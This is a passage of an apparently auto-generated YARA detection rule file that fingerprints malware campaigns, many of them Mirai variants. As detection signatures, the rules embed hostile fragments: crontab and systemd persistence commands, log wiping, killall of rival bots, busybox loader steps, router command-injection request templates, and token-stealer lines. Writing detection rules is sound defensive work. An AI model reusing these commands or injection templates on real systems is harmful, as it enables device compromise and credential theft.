    strings:
        $s0 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s1 = "systemctl daemon-reload 2>/dev/null; systemctl enable killer-helper.service 2>/dev/null" ascii
        $s2 = "journalctl --rotate --vacuum-time=1s 2>/dev/null" ascii
        $s3 = "cannot create TLS data structures: ABORT" ascii
        $s4 = "cannot allocate memory in static TLS block" ascii
        $s5 = "/etc/systemd/system/killer-helper.service" ascii
        $s6 = "Accept-Language: en-US,en;q=0.5" ascii
        $s7 = "Invalid multibyte format string." ascii
        $s8 = "Accept-Encoding: gzip, deflate" ascii
        $s9 = "0.0.0.0 www.hybrid-analysis.com" ascii
        $s10 = "PATH=/usr/sbin:/usr/bin:/sbin:/bin" ascii
        $s11 = "/usr/lib/systemd/.system-helper" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ea0b4bd3_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ea0b4bd3"
        date = "2026-10-15"
        campaign = "tlsh-ea0b4bd3"
        family = "mirai"
        hash = "6c246263128ea32057f1fbfb5293636e09d9cd11f5c60628756c7548bd3093bf"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ea0b4bd3.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (Buildroot 2021.11-18033-g83947c7bb6) 14.3.0" ascii
        $s1 = "Required key not available" ascii
        $s2 = "Key was rejected by service" ascii
        $s3 = "__vdso_clock_gettime64" ascii
        $s4 = "Key has been revoked" ascii
        $s5 = "/usr/local/bin/bash" ascii
        $s6 = "Key has expired" ascii
        $s7 = "/usr/bin/busybox" ascii
        $s8 = "/data/local/tmp" ascii
        $s9 = "/tmp/.Kdat_tmp" ascii
        $s10 = "/usr/bin/bash" ascii
        $s11 = "/usr/bin/sh" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_53b2f07c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-53b2f07c"
        date = "2026-10-15"
        campaign = "tlsh-53b2f07c"
        family = ""
        hash = "000f64c571beb3f09c0405125369610585bd0d60056d64c86ebd1efef88d2df0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-53b2f07c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (Buildroot 2021.11-18033-g83947c7bb6) 14.3.0" ascii
        $s1 = "Required key not available" ascii
        $s2 = "Key was rejected by service" ascii
        $s3 = "Key has been revoked" ascii
        $s4 = "/usr/local/bin/bash" ascii
        $s5 = ".note.gnu.property" ascii
        $s6 = "Key has expired" ascii
        $s7 = "/usr/bin/busybox" ascii
        $s8 = "/data/local/tmp" ascii
        $s9 = "/tmp/.Kdat_tmp" ascii
        $s10 = "/usr/bin/bash" ascii
        $s11 = "/usr/bin/sh" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_9baffd86_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-9baffd86"
        date = "2026-10-15"
        campaign = "dotnet_typelib_guid-9baffd86"
        family = ""
        hash = "1a28f81ebda0180593503eca2aa2cec0e7666fe5ed076eae39d0da1a560e0e83"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-9baffd86.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resources" ascii
        $s1 = "`Gets or sets the SWN p value (probability of casual) for switching algorithm (Floyd 0--p--1 BFS)" ascii
        $s2 = "CThe third parameter of the distribution (shape c, xMin, xMax, k, v)" ascii
        $s3 = "]The probability of transmission per single sexual intercourse from Male to Male, (homosexual)" ascii
        $s4 = "2The fourth parameter of the distribution (xMax, w)" ascii
        $s5 = "7Is the group's population (graph vertices) initialised." ascii
        $s6 = "%System.Globalization.NumberFormatInfo!" ascii
        $s7 = "jThe second parameter of the distribution. (scale b, shape c, xMin, xMax, degree of freedom df, d, p" ascii
        $s8 = "_Gets or sets the maximum size for numerical calculation of the network efficiency (path length)" ascii
        $s9 = "]Gets or sets the number of initial infected individuals for Temporal and Conditional warm-up." ascii
        $s10 = "VGets or sets the probability of concurrent partnerships during the simulation warm-up." ascii
        $s11 = "2Gets or Sets the simulation warm-up configuration." ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1787904 and 12 of them
}

rule Sightlines_tlsh_4aa1b8f2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4aa1b8f2"
        date = "2026-10-15"
        campaign = "tlsh-4aa1b8f2"
        family = ""
        hash = "65a8977a7722df64116a12adf062ec1bcd0cefabe8bccc94307d9aa1b8145134"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4aa1b8f2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\Registry\\Machine\\Software\\Classes\\" wide
        $s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Classes" wide
        $s2 = "SHf7,-fz=8p5$YD" ascii
        $s3 = " nFc1OJT5pNvIn" ascii
        $s4 = "widozagecidaboza" ascii
        $s5 = "tPf9*tKf9l$0tDH" ascii
        $s6 = "1WkMrCmbc$w.{" ascii
        $s7 = "aIt*J;~HQK&W0" ascii
        $s8 = "HR8~H:x&,@K7w" ascii
        $s9 = "3=;Y3u#qK=g1W" ascii
        $s10 = "2iVf&rF{QIy7" ascii
        $s11 = "WE7y#uO9'M_1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 9918464 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_f888feeb_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-f888feeb"
        date = "2026-10-15"
        campaign = "dotnet_typelib_guid-f888feeb"
        family = ""
        hash = "0fdf8b638918ac7a04c36e6ea150548dcd245caa8674601c8a9d5905e77f9bc3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-f888feeb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\"!)(*(+(,(.-/-0-21314151617198;:<:NMOMPMQMRMSMWVXVYVZV[V^]gfml{z}|" wide
        $s1 = "Are you mixing protobuf-net and protobuf-csharp-port? See https://stackoverflow.com/q/11564914/23354" wide
        $s2 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerM" ascii
        $s3 = "Org.BouncyCastle.X509.Allow_Non-DER_TBSCert" wide
        $s4 = "SELECT * FROM Win32_OperatingSystem WHERE Primary='true'" wide
        $s5 = "5ProtoBuf.Meta.MetaType+<GetAllGenericArguments>d__104" ascii
        $s6 = " length; see https://stackoverflow.com/q/2152978/23354" wide
        $s7 = "'signatureAndHashAlgorithm' cannot be null for (D)TLS 1.2+" wide
        $s8 = "invalid length for GOST3410_2012 public key" wide
        $s9 = "invalid length for GOST3410_2001 public key" wide
        $s10 = "SELECT * FROM Win32_DisplayConfiguration" wide
        $s11 = "<149ef234-534f-4248-9e1b-6af875c1ef7c><PrivateImplementationDetails>" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 6660096 and 10 of them
}

rule Sightlines_tlsh_6e5b833a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6e5b833a"
        date = "2026-10-15"
        campaign = "tlsh-6e5b833a"
        family = ""
        hash = "0fdf8b638918ac7a04c36e6ea150548dcd245caa8674601c8a9d5905e77f9bc3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6e5b833a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\"!)(*(+(,(.-/-0-21314151617198;:<:NMOMPMQMRMSMWVXVYVZV[V^]gfml{z}|" wide
        $s1 = "Are you mixing protobuf-net and protobuf-csharp-port? See https://stackoverflow.com/q/11564914/23354" wide
        $s2 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerM" ascii
        $s3 = "Org.BouncyCastle.X509.Allow_Non-DER_TBSCert" wide
        $s4 = "SELECT * FROM Win32_OperatingSystem WHERE Primary='true'" wide
        $s5 = "5ProtoBuf.Meta.MetaType+<GetAllGenericArguments>d__104" ascii
        $s6 = " length; see https://stackoverflow.com/q/2152978/23354" wide
        $s7 = "'signatureAndHashAlgorithm' cannot be null for (D)TLS 1.2+" wide
        $s8 = "invalid length for GOST3410_2012 public key" wide
        $s9 = "invalid length for GOST3410_2001 public key" wide
        $s10 = "SELECT * FROM Win32_DisplayConfiguration" wide
        $s11 = "<149ef234-534f-4248-9e1b-6af875c1ef7c><PrivateImplementationDetails>" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 6565888 and 12 of them
}

rule Sightlines_tlsh_19d3cf5d_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-19d3cf5d"
        date = "2026-10-15"
        campaign = "tlsh-19d3cf5d"
        family = "connectwise"
        hash = "27b75ce758c4a59c60916cde187b814755059d3fddb982d02d397dffd9eb101e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-19d3cf5d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "FJ7ZuWXP5BWViHJTbf5tPj7Sz3VZwFq8m7qZRUuRH8DdT5ZTh16EXQCtQGTdC3%2f6cdeRipg90LvRJZX4%2fUH8mHIc8WT2uHwG" ascii
        $s1 = "owrzdSYAy9REZQ6VQse0UfvmLhINz31AqKPMMoMth4o%2bMavAJ8l%2b4%2b2cAnDO%2bb6%2bFylxuzA&t=&c=&c=&c=&c=&c=&" ascii
        $s2 = "inalUrlEncoding#1regED314AE69CE5D835D523FB365C82C36B[URL_SCHEME]\\shell\\open\\command\"[INSTALLLOCATION" ascii
        $s3 = "0TTG%2bw8jNKIhaiX5%2bAk5V%2fBlG7ZV8vvpvIpen%2bIjWKto%2b%2ft2RaJJkmNEiZXVhbDKkMCgLoguOOEHQTD2zzeE%2b%" ascii
        $s4 = "2bYbIKt2%2btII8jVJd9udccUDkoBTNIilMA4lD%2f18HSK9IXWik3cby%2bIBrxpoP6s%2bA2rbet3WdvT0np%2bdqRuOkf2A8i" ascii
        $s5 = "24?69<>BRTVDFIHLOQX[bhj]_adfnm|{qptvxz~" wide
        $s6 = "{7350F8A0-CE89-45E4-99C4-3D3D88E5E885}NOT SERVICE_ARGUMENTSServiceExeWithoutServiceScrubFiles_Initia" ascii
        $s7 = "IRyesARPNOMODIFYALLUSERS1ManufacturerScreenConnect SoftwareProductCode{B292C5EA-BF5F-428" ascii
        $s8 = "emote Control\"[SERVICE_ARGUMENTS]\"{0C94448B-0C9E-4112-AC7D-B00E6BA76D82}0.0.0.099.0.0.0OLD_PRODUCT_1" ascii
        $s9 = "tallSOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Client[MachineName]Users[SERVICE_NAME]restartnoneR" ascii
        $s10 = "reateProgramDataDirectory{4768BE46-975A-455C-AF15-61A15FE629A4}PROGRAMDATALOCATIONMainFiles{E0EF5F66" ascii
        $s11 = "ntrol\\SafeBoot\\Network\\[SERVICE_NAME]ServiceSoftware\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727Ins" ascii
    condition:
        filesize < 3137536 and 12 of them
}

rule Sightlines_tlsh_379be63e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-379be63e"
        date = "2026-10-15"
        campaign = "tlsh-379be63e"
        family = "mirai"
        hash = "2f7be7bf192bb93d92147d306b1540f549d32d8df9b8d98394728f5f20416d2a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-379be63e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Embedded Telnet Server.*WARNING:.*authorized users only" ascii
        $s1 = "(crontab -l 2>/dev/null; printf '@reboot %s %s &\\n') | crontab - 2>/dev/null" ascii
        $s2 = "killall -9 httpd lighttpd boa goahead mini_httpd webs 2>/dev/null" ascii
        $s3 = "killall -9 .t .nttpd .sh4 dvrHelper yakuza .mi mozi satori .tsunami .hakai .owari mirai hajime .nipp" ascii
        $s4 = "/bin/busybox chmod 777 .f || chmod 777 .f; ./.f telnet; rm -f .f" ascii
        $s5 = "on macHelper .z .loaded zollard .chinaz .sh 2>/dev/null" ascii
        $s6 = "/bin/busybox cat /proc/self/exe || cat /proc/self/exe" ascii
        $s7 = "TELNET session now in ESTABLISHED state" ascii
        $s8 = "/bin/busybox cat /proc/cpuinfo || cat /proc/cpuinfo" ascii
        $s9 = "Ubee Interactive Corporation Telnet Server" ascii
        $s10 = "NetComm ADSL2\\S Wireless Router" ascii
        $s11 = "Copyright (c) 2010-2012 Hewle" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_signer_cert_sha1_2cf78abf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-2cf78abf"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-2cf78abf"
        family = ""
        hash = "0f885b509a685d2bbfa652fed26b5fb31d88fbdab0a978c641d1c7b8aa460aa9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-2cf78abf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "260515184909Z0t1" ascii
        $s1 = "230217+5049170" ascii
        $s2 = "230889+5049200" ascii
        $s3 = "260515182606Z0" ascii
        $s4 = "250515184909Z" ascii
        $s5 = "250515182606Z" ascii
        $s6 = "G!2Wv[.O" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1115456 and 7 of them
}

rule Sightlines_signer_cert_sha1_142fb118_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-142fb118"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-142fb118"
        family = ""
        hash = "184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-142fb118.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "260515184910Z0t1" ascii
        $s1 = "230217+5049070" ascii
        $s2 = "230889+5049100" ascii
        $s3 = "260515182607Z0" ascii
        $s4 = "250515182607Z" ascii
        $s5 = "250515184910Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1107104 and 6 of them
}

rule Sightlines_signer_cert_sha1_80c681b1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-80c681b1"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-80c681b1"
        family = ""
        hash = "2e5883a09cfc4391cb81db3f0da4d9b8cda21fc1b287e73a1624ad518d941b94"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-80c681b1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ")Microsoft 3rd Party Application Component0" ascii
        $s1 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." ascii
        $s2 = "*** buffer overflow detected ***: terminated" ascii
        $s3 = "*** stack smashing detected ***: terminated" ascii
        $s4 = "__imp_IsProcessorFeaturePresent" ascii
        $s5 = "__lib64_libmsvcrt_def_a_iname" ascii
        $s6 = "_head_lib64_libmsvcrt_def_a" ascii
        $s7 = "__imp____mb_cur_max_func" ascii
        $s8 = "260707184831Z0" ascii
        $s9 = "231522+5051180" ascii
        $s10 = "250515184831Z" ascii
        $s11 = "__imp_memset" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4473808 and 12 of them
}

rule Sightlines_signer_cert_sha1_4337b99f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-4337b99f"
        date = "2026-10-15"
        campaign = "signer_cert_sha1-4337b99f"
        family = ""
        hash = "2803b74d5466845e4dc9063bd516f3679aa2a3f70a30d9e93976c212e87f6e87"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-4337b99f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "http://www.vmware.com/0/" ascii
        $s1 = "g_return_if_fail_warning" ascii
        $s2 = "noreply@vmware.com0" ascii
        $s3 = "VMware, Inc.1!0" ascii
        $s4 = "g_strdup_printf" ascii
        $s5 = "230810235959Z0" ascii
        $s6 = "glib-2.0.dll" ascii
        $s7 = "Palo Alto1" ascii
        $s8 = "Wv37RX_hs" ascii
        $s9 = "210810000000Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2463984 and 7 of them
}

rule Sightlines_tlsh_2b53824b_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2b53824b"
        date = "2026-10-15"
        campaign = "tlsh-2b53824b"
        family = "mirai"
        hash = "603ea7cb6035de6c10c2d1cac0f1ab5355a96e60a7235eaecafc832ec9a5e29d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2b53824b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fe862d8f_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fe862d8f"
        date = "2026-10-15"
        campaign = "tlsh-fe862d8f"
        family = "mirai"
        hash = "118385e79114cb138d99509523ec8288069f5a04479428ade0c5b2f95a080b99"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fe862d8f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_bf304854_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bf304854"
        date = "2026-10-15"
        campaign = "tlsh-bf304854"
        family = "mirai"
        hash = "7681a776f8474fe00a2735d9f66fdc92148043e3dd8256a43b5377b6569f68b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bf304854.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s1 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8" ascii
        $s2 = "systemctl disable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s3 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s4 = "systemctl is-enabled systemd-network-helper.service >/dev/null 2>&1" ascii
        $s5 = "systemctl enable systemd-network-helper.service >/dev/null 2>&1" ascii
        $s6 = "nvram set rc_startup=\"%s\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s7 = "nvram set rc_startup=\"\" >/dev/null 2>&1 && nvram commit >/dev/null 2>&1" ascii
        $s8 = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s9 = "Content-Disposition: form-data; name=\"file\"; filename=\"%s.txt\"" ascii
        $s10 = "mount -o remount,rw /system >/dev/null 2>&1" ascii
        $s11 = "systemctl daemon-reload >/dev/null 2>&1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_rich_header_hash_6a7fcf10_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-6a7fcf10"
        date = "2026-10-15"
        campaign = "rich_header_hash-6a7fcf10"
        family = ""
        hash = "0e823fe2692ba740b73c8f0cc47f2d732ede3b17dd7d268219e7e1611b9ae239"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-6a7fcf10.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "tUH9\\$htN9\\$`~H" ascii
        $s1 = "H USVWATAUAVAWH" ascii
        $s2 = " BD8d$`t5M" ascii
        $s3 = "0uNH9|$@tG" ascii
        $s4 = "D$ H5J)n(H" ascii
        $s5 = "D$@H5`fZ8H" ascii
        $s6 = "D$pH5*UBoH" ascii
        $s7 = "D$pH50B|ZH" ascii
        $s8 = "HcD$`Hc\\$8H" ascii
        $s9 = "]ofD9\"t#H" ascii
        $s10 = "mKD9s ~yI" ascii
        $s11 = "xJL9l$PtC" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4399140 and 12 of them
}

rule Sightlines_tlsh_94d2c83c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-94d2c83c"
        date = "2026-10-15"
        campaign = "tlsh-94d2c83c"
        family = ""
        hash = "0e823fe2692ba740b73c8f0cc47f2d732ede3b17dd7d268219e7e1611b9ae239"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-94d2c83c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "tUH9\\$htN9\\$`~H" ascii
        $s1 = "H USVWATAUAVAWH" ascii
        $s2 = " BD8d$`t5M" ascii
        $s3 = "0uNH9|$@tG" ascii
        $s4 = "D$ H5J)n(H" ascii
        $s5 = "D$@H5`fZ8H" ascii
        $s6 = "D$pH5*UBoH" ascii
        $s7 = "D$pH50B|ZH" ascii
        $s8 = "HcD$`Hc\\$8H" ascii
        $s9 = "]ofD9\"t#H" ascii
        $s10 = "mKD9s ~yI" ascii
        $s11 = "xJL9l$PtC" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4399140 and 12 of them
}

rule Sightlines_tlsh_06ab1200_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-06ab1200"
        date = "2026-10-15"
        campaign = "tlsh-06ab1200"
        family = ""
        hash = "4dcba7f07c31f2d0410ea3efb2f067c1ccf24b8318012514302fcc65ec06b30d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-06ab1200.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    return BROWSER_ICONS.get(browser_name, \"https://media.discordapp.net/attachments/140263598965404" ascii
        $s1 = "        ps = f\"Add-Type -AssemblyName System.Security;$b=[Convert]::FromBase64String('{b64}');$p=[Sy" ascii
        $s2 = "    \"BUG_HUNTER_LEVEL_2\": {\"value\": 16384, \"emoji\": EMOJIS[\"bughuntergold\"], \"rare\": True}," ascii
        $s3 = "/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids={account}\", timeout=5)" ascii
        $s4 = "    \"EARLY_BOT_DEVELOPER\": {\"value\": 131072, \"emoji\": EMOJIS[\"early_verified_bot_developer\"], \"rare\"" ascii
        $s5 = "    \"ACTIVE_DEVELOPER\": {\"value\": 4194304, \"emoji\": EMOJIS[\"active_developer\"], \"rare\": False}" ascii
        $s6 = "    \"HYPESQUAD_EVENTS\": {\"value\": 4, \"emoji\": EMOJIS[\"hypesquad_events\"], \"rare\": True}," ascii
        $s7 = "    \"CERTIFIED_MODERATOR\": {\"value\": 262144, \"emoji\": EMOJIS[\"moderatorprogramsalumni\"], \"rare\": Tru" ascii
        $s8 = "    \"HOUSE_BRILLIANCE\": {\"value\": 128, \"emoji\": EMOJIS[\"brilliance\"], \"rare\": False}," ascii
        $s9 = "SKIBIDI_INJ = \"https://pomf2.lain.la/f/hxdmhotz.txt\" # injection url dual hook de" ascii
        $s10 = "1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE\"" ascii
        $s11 = "    \"EARLY_SUPPORTER\": {\"value\": 512, \"emoji\": EMOJIS[\"early_supporter\"], \"rare\": True}," ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_8d56894b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8d56894b"
        date = "2026-10-15"
        campaign = "tlsh-8d56894b"
        family = ""
        hash = "045246d3f90019498bec9b92b1d42a057906049ca5313a47c6f5262eff7801a9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8d56894b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "[{Fore.WHITE}~/{system_text}/{pc_name}{Fore.GREEN}]" ascii
        $s1 = "{Fore.WHITE}$ {Style.RESET_ALL}\"\"\")" ascii
        $s2 = "({Fore.WHITE}{username}{Fore.GREEN})" ascii
        $s3 = "from config.settings import *" ascii
    condition:
        filesize < 1048576 and 4 of them
}

rule Sightlines_tlsh_1fa020be_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1fa020be"
        date = "2026-10-15"
        campaign = "tlsh-1fa020be"
        family = "mirai"
        hash = "1f033b961e57f63b7dc2735bb21abebd94ebca07c2b2b08068f0faf8af18623f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1fa020be.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DMCCRe7HaAgEeoZzN31Fu9LjO/wl9ngRG3jRpXKRSzds+N4GSOL/NymOIlRTL+R1QakC03hcj1Zqoi2FyPBmiVCnxlbgqpYkum1N" ascii
        $s1 = "v+6LOO5aoJrn0qJRcQ5rbpb4IKVjRrOrHMNShtRRLdWAZ3UiMvpDyOoO7a6PIpGk4hRP89NqZQldou3t6KTUhUKqFNc/JXYzyZj2" ascii
        $s2 = "wSbUApq6npt6MrE/917Hc3efVV93zbHgLh1CFWYass8cJ8OZ17c4KTtmDZtKY+q/9ZOya6Q0PPTo6BchnNzEQQIDAQAB" ascii
        $s3 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmmFi2EB5BpqTSnj66P5Sd5CX+2p+eelmwR0PUuf7paUg9o7KBvAFPM0p" ascii
        $s4 = "WireGuard v1 zx2c4 Jason@zx2c4.comNoise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s5 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><m:AddPortMapping x" ascii
        $s6 = "<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" S" ascii
        $s7 = "GET /setup.cgi?todo=ping_test&next_file=diagping.htm&c4_IPAddr=;%s HTTP/1.1" ascii
        $s8 = "GET /cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=wizard&var:subpage=wiz_wan_,;%s" ascii
        $s9 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%s)</language>" ascii
        $s10 = "GET /adv,/cgi-bin/weblogin.cgi?username=admin';%s;' HTTP/1.1" ascii
        $s11 = "GET /cgi-bin/masterCGI?ping=nomip&user=;%s; HTTP/1.1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_695aa8e5_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-695aa8e5"
        date = "2026-10-15"
        campaign = "tlsh-695aa8e5"
        family = "mirai"
